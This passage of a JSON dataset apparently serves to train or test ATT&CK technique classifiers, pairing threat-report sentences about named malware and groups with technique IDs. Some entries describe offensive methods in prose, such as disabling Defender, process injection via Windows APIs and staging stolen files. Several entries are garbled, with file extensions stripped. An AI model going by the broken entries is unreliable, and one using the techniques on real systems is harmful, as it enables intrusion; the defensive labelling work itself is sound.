    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "has created a scheduled task that executes every hour to establish persistence.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "We found a mechanism for decrypting, executing, and downloading an additional payload from the C&C server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "collects MAC address and local IP address information from the victim.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "stores information gathered from the endpoint in a file named 1.hwp.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "has used sctasks for persistence. ",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The command CollectSystemDescription retrieves the following information:\n\nLocal Computer Domain name\nAdministrator Account SID\nHostName",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "attempts to disable Windows Defender",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "has used malware that can collect the victims OS version and machine name.(Citation: Securelist MuddyWater Oct 2018)(Citation: Talos MuddyWater May 2019)(Citation: Reaqta MuddyWater November 2017)(Citation: Trend Micro Muddy Water March 2021)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has written its payload into a newly-created `EhStorAuthn.exe` process using `ZwWriteVirtualMemory` and executed it using `NtQueueApcThread` and `ZwAlertResumeThread`.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has downloaded an auxiliary program named ff.exe to infected machines.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "collects system information including the operating system version and hostname.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has created scheduled tasks to maintain persistence on a compromised host.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "for initial access is RDP compromise.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "It uses GetSystemDefaultUILanguage and GetUserDefaultUILanguage to",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "can retrieve an additional payload from its C2 server.(Citation: ESET Sednit Part 1)(Citation: Unit 42 Sofacy Feb 2018)  has a command to download files to the victims machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Reconfigures Windows Defender to exclude the user profile path and the entire system drive from scanning.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "can execute via rundll32.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "it uses the following command to delete the data in PSReadline",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can retrieve configuration data from a compromised AD FS server.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "can delete files from a compromised host after they are exfiltrated.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "writes another batch file",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Command codes in the PUBLOAD HTTP variant",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has used both HTTP and HTTPS for C2.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can store harvested data in a custom database under the %TEMP% directory.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "LoadLibraryW loads the module, VirtualAlloc allocates the memory, CreateProcessW created a process, and ZwUnmapViewOfSection is used",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to enumerate the users home directory and the path to its own application bundle.(Citation: objective-see windtail1 dec 2018)",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has a command to delete a file. It also can uninstall scripts and delete files to cover its track.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "During its initial execution  extracts operating system information from the infected host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can gather the OS version architecture information connected drives hostname RAM size and disk space information from the victims machine and has used cmd /c systeminfo command to get a snapshot of the current system state of the target machine.(Citation: Talos Konni May 2017)(Citation: Medium KONNI Jan 2020)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "adds itself to a Registry Run key with the name guidVGA or guidVSA.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can run a copy of cmd.exe.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has collected the username of the victim system.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Threat Group-3390 ran a command to compile an archive of file types of interest from the victim user's directories.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "APT1 has collected files from a local victim.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "APT28 has retrieved internal documents from machines inside victim environments, including by using Forfiles to stage documents before.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "APT3 will identify Microsoft Office documents on the victim's computer.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "APT37 has collected data from victims' local systems.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "When it first starts, BADNEWS crawls the victim's local drives and collects documents with the following extension , x, , , x, and .",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "BadPatch collects files from the local system that have the following extensions, then prepares them for exfiltratio , x, , , , , , x.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Bankshot collects files from the local system.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "BRONZE BUTLER has exfiltrated files stolen from local systems.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Calisto can collect data from user directories.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "China Chopper's server component can upload local files.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Cobalt Strike can collect data from a local system.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "CosmicDuke steals user files from local hard drives with file extensions that match a predefined list.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Dark Caracal collected complete contents of the 'Pictures' folder from compromised Windows systems.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Dragonfly 2.0 collected data from local victim systems.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Dust Storm has used Android backdoors capable of exfiltrating specific files directly from the infected devices.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "FLASHFLOOD will scan the My Recent Documents, Desktop, Temporary Internet Files, and TEMP directories.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "FLASHFLOOD also collects information stored in the Windows Address Book.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Forfiles can be used to act on",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "GravityRAT steals files with the following extension x, , x, , x, , , and .",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Honeybee collects data from the local victim system.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Hydraq creates a backdoor through which remote attackers can read data from files.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Ixeshe can collect data from a local system.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Kazuar uploads files from a specified directory to the C2 server.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Ke3chang gathered information and files from local directories for exfiltration.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Kimsuky has collected Office, PDF, and HWP documents from its victims.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Koadic can download files off the target system to send back to the server.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Lazarus Group malware IndiaIndia saves information gathered about the victim to a file that is uploaded to one of its 10 C2 servers.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Lazarus Group malware RomeoDelta copies specified directories from the victim's machine, then archives and encrypts the directories before uploading to its C2 server.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "LightNeuron can collect files from a local system.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Linfo creates a backdoor through which remote attackers can obtain data from local systems.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Machete searches the File system for files of interest.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "menuPass has collected various files from the compromised computers.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "MobileOrder exfiltrates data collected from the victim mobile device.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "njRAT can collect data from a local system.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Pasam creates a backdoor through which remote attackers can retrieve files.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Patchwork collected and exfiltrated files from the infected system.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "PinchDuke collects user files from the compromised host based on predefined file extensions.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "PoisonIvy creates a backdoor through which remote attackers can steal system information.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "PowerSploit contains a collection of Exfiltration modules that can access data from local files, volumes, and processes.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "POWERSTATS can upload files from compromised hosts.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Proxysvc searches the local system and gathers data.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "PUNCHTRACK scrapes memory for properly formatted payment card data.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "RawPOS dumps memory from specific processes on a victim system, parses the dumped files, and scrapes them for credit card data.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Rover searches for files on local drives based on a predefined list of file extensions.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Soft Cell collected data from the victim's local system, including password hashes from the SAM hive in the Registry.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Stealth Falcon malware gathers data from the local victim system.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Turla RPC backdoors can upload files from victim machines.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Ursnif has collected files from victim machines, including certificates and cookies.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "yty collects files with the following extension , x, , , x, , x, m, , , m, , , , and sends them back to the C2 server.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Some SeaDuke samples have a module to extract email from Microsoft Exchange servers using compromised credentials.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "ADVSTORESHELL is capable of starting a process using CreateProcess.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "APT37 leverages the Windows API call VirtualAlloc , WriteProcessMemory , and CreateRemoteThread for process injection.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "BADNEWS has a command to download an and execute it via CreateProcess API.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "It can also run with ShellExecute.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Bankshot creates processes using the Windows API call CreateProcessA and CreateProcessAsUserA .",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Cobalt Strike's \"beacon\" payload is capable of running shell commands without cmd and PowerShell commands without powershell",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Empire contains a variety of enumeration modules that have an option to use API calls to carry out tasks.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Gorgon Group malware can leverage the Windows API call, CreateProcessA , for execution.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "HAWKBALL has leveraged several Windows API calls to create processes, gather disk information, and detect debugger activity.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "HyperBro has the ability to run an application or script/file via API.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "InnaputRAT uses the API call ShellExecuteW for execution.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "LightNeuron is capable of starting a process using CreateProcess.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Mosquito leverages the CreateProcess and LoadLibrary calls to execute files with the and extensions.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "PlugX can use the Windows API function CreateProcess to execute another process.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "RDFSNIFFER has used several Win32 API functions to interact with the victim machine.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Silence leverages the Windows API to perform a variety of tasks.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "SynAck parses the export tables of system DLLs to locate and call various Windows API functions.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "TrickBot uses the Windows API call, CreateProcessW , to manage execution flow.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Turla and its RPC backdoors have used APIs calls for various tasks related to subverting AMSI and accessing then executing commands through RPC and/or named pipes.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Ursnif has used CreateProcessW to create child processes.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Volgmer executes payloads using the Windows API call CreateProcessW .",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "XAgentOSX contains the execFile function to execute a specified file on the system using the NSTas method.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "APT18 actors leverage legitimate credentials to log into external remote services.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Night Dragon has used compromised VPN accounts to gain access to victim systems.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "3PARA RAT has a command to retrieve metadata for files on disk as well as a command to list the current working directory.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "4H RAT has the capability to obtain file and directory listings.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "admin@338 actors used the following commands after exploiting a machine with LOWBALL malware to obtain information about files and directorie dir directorydirectory",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "ADVSTORESHELL can list files and directories.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "APT18 can list files information for specific directories.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "APT28 has used Forfiles to locate PDF, Excel, and Word documents during.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The group also searched a compromised DCCC computer for specific terms.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "APT3 has a tool that looks for files and directories on the local file system.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "APT32's backdoor possesses the capability to list files and directories on a machine.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "AuditCred can search through folders and files on the system.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "AutoIt backdoor is capable of identifying documents on the victim with the following extension ; , , , x, , , x, x, and g.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Azorult can recursively search for files in folders and collects files from the desktop with certain extensions.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "BabyShark has used dir to search for \"programfiles\" and \"appdata\".",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Backdoor.Oldrea collects information about available drives, default browser, desktop file list, My Documents, Internet history, program files, and root of available drives.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "It also searches for ICS-related software files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "BACKSPACE allows adversaries to search for files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "BADNEWS identifies files with certain extensions from USB devices, then copies them to a predefined directory.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Bankshot searches for files on the victim's machine.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "BBSRAT can list file and directory information.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "BLACKCOFFEE has the capability to enumerate files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "BlackEnergy gathers a list of installed apps from the uninstall program Registry.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "It also gathers registered mail, browser, and instant messaging clients from the Registry.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "BlackEnergy has searched for given file types.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "BRONZE BUTLER has collected a list of files from the victim and uploaded it to its C2 server, and then created a new list of specific files to steal.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Cannon can obtain victim drive information as well as a list of folders in directory",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Cardinal RAT checks its current working directory upon execution and also contains watchdog functionality that ensures its executable is located in the correct path .",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "ChChes collects the victim's %TEMP% directory path and version of Internet Explorer.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "China Chopper's server component can list directory contents.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "An older version of CHOPSTICK has a module that monitors all mounted volumes for files with the extensions , x, , , .m2f, or .m2o.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "cmd can be used to find files and directories with native functionality such as dir commands.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "CORALDECK searches for specified files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "CosmicDuke searches attached and mounted drives for file extensions and keywords that match a predefined list.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Crimson contains commands to list files and directories, as well as search for files matching certain extensions from a defined list.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "CrossRAT can list all files on a system.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Dark Caracal collected file listings of all default Windows directories.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Denis has several commands to search directories for files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Derusbi is capable of obtaining directory, file, and drive listings.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Dragonfly 2.0 used a batch script to gather folder and file names from victim hosts.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Dust Storm has used Android backdoors capable of enumerating specific files on the infected devices.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "DustySky scans the victim for files that contain certain keywords from a list that is obtained from the C2 as a text file.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "It also collects information about installed software.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "A variant of Elise executes dir directory",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "ELMER is capable of performing directory listings.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Empire includes various modules for finding files of interest on hosts and network shares.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Epic recursively searches for all files on the system and collects a directory listing of the Desktop, %TEMP%, and directory",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "FALLCHILL can search files on a victim.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "FinFisher enumerates directories and scans for certain files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Forfiles can be used to locate certain types of files/directories in a system.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "FruitFly looks for specific files and file types.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Fysbis has the ability to search for files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "GeminiDuke collects information from the victim, including installed drivers, programs previously executed by users, programs and services configured to automatically run at startup, files and folders present in any user's home folder, files and folders present in any user's My Documents, programs installed to the Program Files folder, and recently accessed files, folders, and programs.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "GravityRAT collects the volumes mapped on the system, and also steals files with the following extension x, , x, , x, , , and .",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "HOPLIGHT has been observed enumerating system drives and partitions.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "HTTPBrowser is capable of listing files, folders, and drives on a victim.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Hydraq creates a backdoor through which remote attackers can check for the existence of files, including its own components, as well as retrieve a list of logical drives.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "InnaputRAT enumerates directories and obtains file attributes on a system.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "InvisiMole can lists information about files in a directory.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Ixeshe can list file and directory information.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "JPIN can enumerate drives and their types.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "It can also change file permissions using cacls .",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "jRAT can browse file systems.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Kasidet has the ability to search for a given filename on a victim.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Kazuar finds a specified directory, lists the files and metadata about those files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Ke3chang uses command-line interaction to search files and directories.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "KeyBoy has a command to launch a file browser or explorer on the system.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Kimsuky has the ability to enumerate all the drives on an infected system.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "A version of KONNI searches for filenames created with a previous version of the malware, suggesting different versions targeted the same victims and the versions may work together.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Kwampirs collects a list of files and directories in directorydirectory directory directory\"directory\".",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Several Lazarus Group malware samples use a common function to identify target files by their extension.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Lazarus Group malware families can also enumerate files and directories, including a Destover-like variant that lists files and gathers information for all drives.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Leafminer used a tool called MailSniper to search for files on the desktop and another utility called Sobolsoft to extract attachments from EML files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Linfo creates a backdoor through which remote attackers can list contents of drives and search for files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Machete produces file listings in order to search for files to be exfiltrated.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Magic Hound malware can list a victim's logical drives and the type, as well the total/free space of the fixed devices.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Other malware can list a directory's contents.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Micropsia can perform a recursive directory listing for all volume drives available on the victim's machine and can also fetch specific files by their paths.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Misdat is capable of running commands to obtain a list of files and directories, as well as enumerating logical drives.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "MobileOrder has a command to upload to its C2 server information about files on the victim mobile device, including SD card size, installed app list, SMS content, contacts, and calling history.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "MoonWind has a command to return a directory listing for a specified directory.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "MuddyWater has used malware that checked if the ProgramData folder had folders or files with the keywords \"Kasper,\" \"Panda,\" or \"ESET.\"",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "NDiskMonitor can obtain a list of all files and directories as well as logical drives.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "NETEAGLE allows adversaries to enumerate and modify the infected host's file system.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "It supports searching for directories, creating directories, listing directory contents, reading and writing to files, retrieving file attributes, and retrieving volume information.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "njRAT can browse file systems using a file manager module.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "OceanSalt can extract drive information from the endpoint and search files on the system.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Octopus collects information on the Windows directory and searches for compressed RAR files on the host.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Orz can gather victim drive information.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "OwaAuth has a command to list its directory and logical drives.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Pasam creates a backdoor through which remote attackers can retrieve lists of files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "A Patchwork payload has searched all fixed drives on the victim for files matching a specified list of extensions.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "PinchDuke searches for files created within a certain timeframe and whose file extension matches a predefined list.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Pisloader has commands to list drives on the victim machine and to list file information for a given directory.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "PlugX has a module to enumerate drives and find files recursively.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "POORAIM can conduct file browsing.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "PoshC2 can enumerate files on the local file system and includes a module for enumerating recently accessed files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
